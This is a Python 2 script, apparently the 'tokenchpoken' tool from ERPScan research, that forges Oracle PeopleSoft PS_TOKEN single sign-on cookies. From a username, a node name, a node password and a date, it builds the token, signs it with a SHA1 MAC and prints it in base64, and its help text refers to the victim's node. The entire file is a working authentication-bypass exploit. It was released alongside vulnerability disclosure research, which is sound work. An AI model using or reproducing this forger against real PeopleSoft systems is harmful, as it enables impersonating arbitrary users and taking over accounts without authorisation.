#!/usr/bin/python
import string
import base64
import hashlib
import zlib
import argparse

"""
Credit: erpscan
https://erpscan.com/press-center/blog/peoplesoft-security-part-3-peoplesoft-sso-tokenchpoken-attack/
"""

print
print 'tokenchpoken v0.5 beta '
print 'Oracle PS_TOKEN cracker. Token generator'
print
print 'Alexey Tyurin - a.tyurin at erpscan.com'
print 'ERPScan Research Group - http://www.erpscan.com'
print
parser = argparse.ArgumentParser()
parser.add_argument('-u', action='store', dest='username', required=True, help='Set a username, which exist in the victim\'s node. For example, PS')
parser.add_argument('-p', action='store', dest='nodepassword', required=True, help='Set the password of the node')
parser.add_argument('-l', action='store', dest='lang', default="ENG" , help='Set the language. A default value is ENG')
parser.add_argument('-n', action='store', dest='nodename', required=True,  help='Set the name of the victim\'s node')
parser.add_argument('-d', action='store', dest='date', required=True, help='Set the date and time in format "YYYY-MM-DD-HH.mm.ss" !without milisecs!. For example, 2014-06-28-22.33.55')
parser.add_argument('-e', action='store', dest='end', required=True, help='Set an endianness of PS_TOKEN (0-little,1-big)')
parser.add_argument('-v', action='store', dest='verbose', default=False, help='Be more lovely')

args = parser.parse_args()

token_ver="8.10"
unknown_field="N"

if args.end=="1":
    print "Big endian is set"
    username=args.username.encode('utf_16_be')
    nodepassword=args.nodepassword.encode('utf_16_le')
    lang=args.lang.encode('utf_16_be')
    nodename=args.nodename.encode('utf_16_be')
    #change miliseconds if you want
    # date=(args.date+'.164266').encode('utf_16_be')
    date = args.date.encode('utf_16_be')
    token_ver=token_ver.encode('utf_16_be')
    unknown_field=unknown_field.encode('utf_16_be')

elif args.end=="0":
    print "Little endian is set"
    username=args.username.encode('utf_16_le')
    nodepassword=args.nodepassword.encode('utf_16_le')
    lang=args.lang.encode('utf_16_le')
    nodename=args.nodename.encode('utf_16_le')
    #change miliseconds if you want
    # date=(args.date+'.999543').encode('utf_16_le')
    date = args.date.encode('utf_16_le')
    token_ver=token_ver.encode('utf_16_le')
    unknown_field=unknown_field.encode('utf_16_le')
else:
    print "Incorrect endianness is set"
    exit()

print

def make_field(part, size):
    part=chr(len(part)+size)+part
    return part

if args.end=="1":
    uncompressed_data='\x01\x02\x03\x04\x00\x01\x00\x00\x00\x00\x02\xbc\x00\x00\x00\x00'+make_field(username,0)+make_field(lang,0)+make_field(nodename,0)+make_field(date,0)+'\x00'
    uncompressed_field='\x00\x00\x00' + make_field(uncompressed_data,4)
elif args.end=="0":
    uncompressed_data='\x00\x00\x00\x04\x03\x02\x01\x01\x00\x00\x00\xbc\x02\x00\x00\x00\x00\x00\x00'+make_field(username,0)+make_field(lang,0)+make_field(nodename,0)+make_field(date,0)+'\x00'
    uncompressed_field=make_field(uncompressed_data,1)

inflate_data=zlib.compress( uncompressed_field )


#print inflate_data.encode('hex')

sha1_mac= hashlib.sha1(uncompressed_field+nodepassword).digest()
uncompressed_length=chr(len(uncompressed_field))
#print uncompressed_length.encode("hex")

#print sha1_mac.encode('hex')
if args.verbose:
    print 
    print (uncompressed_field+nodepassword).encode('hex')
    print  hashlib.sha1(uncompressed_field+nodepassword).hexdigest()

if args.end=="1":
    static_headers1='\x01\x02\x03\x04\x00\x01\x00\x00\x00\x00\x02\xbc\x00\x00\x00\x00\x00\x00\x00\x2c\x00\x04\x53\x68\x64\x72\x02'+unknown_field+uncompressed_length+'\x08'+token_ver+'\x14'
    static_headers2='\x00\x05\x53\x64\x61\x74\x61'
    body='\x00\x00\x00'+make_field(static_headers2+make_field(inflate_data,0),4)
    token='\x00\x00\x00'+make_field(static_headers1+sha1_mac+body,4)
    
elif args.end=="0":
    static_headers1='\x00\x00\x00\x04\x03\x02\x01\x01\x00\x00\x00\xbc\x02\x00\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x04\x00\x53\x68\x64\x72\x02'+unknown_field+uncompressed_length+'\x08'+token_ver+'\x14'
    static_headers2='\x00\x00\x00\x05\x00\x53\x64\x61\x74\x61'
    body=make_field(static_headers2+make_field(inflate_data,0),1)
    token=make_field(static_headers1+sha1_mac+body,1)


full_str=base64.b64encode(token)

print "New PS_TOKEN:" 
print full_str

